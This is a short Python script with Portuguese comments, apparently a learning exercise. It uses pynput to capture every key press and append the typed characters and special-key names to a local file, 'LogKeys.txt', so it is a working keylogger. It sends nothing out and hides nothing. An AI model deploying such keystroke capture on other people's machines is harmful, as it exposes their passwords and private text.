from pynput.keyboard import Listener, Key

# Contagem das qtd de vezes que o caps lock foi pressionado
cont_caps = 0

def Pressionar(tecla):
	global cont_caps

	file = open("LogKeys.txt", "a") # Cria um arquivo de logs

	if tecla == Key.caps_lock:
		cont_caps += 1

	try: # Testa apenas teclas alfanuméricas
		if cont_caps % 2 != 0: # Se a qtd de vezes que o caps lock foi pressionado é impar, as letras ficam maiúsculas
			file.write(f"{tecla.char.upper()}")

		else: # Senão, é minúscula
			file.write(f"{tecla.char}")

	except: # Dará erro senão for alfanumérica, logo será tratado o erro 
		if tecla == Key.space: # Tecla espaço recebe um texto vazio
			file.write(" ")

		elif tecla == Key.caps_lock or tecla == Key.shift: # Tecla caps lock e shift não recebe texto
			file.write("")

		else: # Caso não seja nenhuma das citadas acima será escrito uma mensagem
			file.write(f"Tecla especial ({tecla}) pressionada!")

	file.close() # Fecha o arquivo de logs

with Listener(on_press=Pressionar) as listener: # Apenas quando a função Listener for chamado, o método join será ativado
	listener.join()
